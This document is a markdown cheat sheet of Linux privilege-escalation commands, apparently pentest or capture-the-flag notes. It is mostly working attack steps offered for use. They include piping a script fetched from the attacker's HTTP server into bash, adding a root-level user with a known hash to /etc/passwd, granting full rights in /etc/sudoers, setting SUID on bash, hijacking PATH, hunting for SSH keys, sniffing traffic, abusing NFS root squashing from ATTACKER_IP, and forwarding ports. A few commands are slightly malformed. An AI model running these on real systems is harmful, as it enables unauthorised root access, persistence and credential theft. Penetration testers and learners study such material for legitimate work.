# Privesc

## LinEnum

```
python -m SimpleHTTPServer 8000
```

```
curl IP:8000/linenum.sh | bash
```

Add -t for a thorough check

## Linux priv checker

## linux-smart-enumeration

Unlike LinEnum, lse tries to gradualy expose the information depending on its importance from a privesc point of view.

https://github.com/diego-treitos/linux-smart-enumeration

## Useful commands

Obtain the kernel version

```
uname -a
```

Check for misconfigurations in permissions

```
whoami

id

sudo -l

history
```

Find processes running as root

```
ps -ef | grep root
```

Process log files

```
cat file | awk '{print 7}' | sort | uniq -c
```

### Network enumeration

Find network cards, routes and reachable networks

```bash
ip addr
ip route
ip neigh
```

See running ports

```
netstat -tunlp

netstat -ano
```

### Add sudo password hash
A user with password toor

```
$ openssl passwd -1 -salt salt password

echo 'user1:sXuCKi7k3Xh/s:0:0::/root:/bin/bash' > /tmp/hack
append /tmp/hack to /etc/passwd
```

### Add user to sudoers

```
echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers
```

### SUID bit add to /bin/bash

```bash
echo "chmod 4777 /bin/bash" >> backup.sh

as root

cp /bin/bash /tmp/bash; chmod +s /tmp/bash
```

## Finding SUID bits

```
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -ls 2>/dev/null
```

## Finding writable dirs

```
find /-writable -type d 2>/dev/null
```

## Find file

```bash
find / -name id_rsa 2>/dev/null
```

## TCP Dump

```
cd /tmp
tcpdump -D
tcpdump -w file.pcap -i lo
```

## PSPY32

pspy32 script which is a little command-line script which basically monitors scheduled Linux processes

```
cd /tmp
upload /pspy32
python -c 'import pty;pty.spawn("/bin/bash")'
chmod 777 pspy32
./pspy32
```

## PATH variable exploitation

```
cd /tmp

echo "/bin/bash" > ps
chmod 777 ps

or 

cp /bin/sh /tmp/ps

echo $PATH
export PATH=/tmp:$PATH
cd /home/raj/script
./shell
whoami
```

## Capabilities

```
getcap -r / 2>/dev/null
```

## NFS Root Squashing

```
cat /etc/exports

check for no_root_squash

On the attacker machine
mount -o rw, vers=2 ATTACKER_IP:/tmp /mount/attacker

```

## Port Forwarding

`ss -tulpn` it will tell us what socket connections are running

To forward a port

```
ssh -L 10000:localhost:10000 <username>@<ip>
```

### Meterpreter

```
portfwd add -l 22 -p 22 -r 127.0.0.1
```

-l is our local port we want to use.
-p is the remote port we want to get access to.
-r is the remote address

### socat binary

```
/tmp/socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22
```

[linuxprivchecker.py -- a Linux Privilege Escalation Check Script](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py)

[Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

[Linux Privilege Escalation using SUID Binaries](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)

[ A guide to Linux Privilege Escalation](https://payatu.com/guide-linux-privilege-escalation)
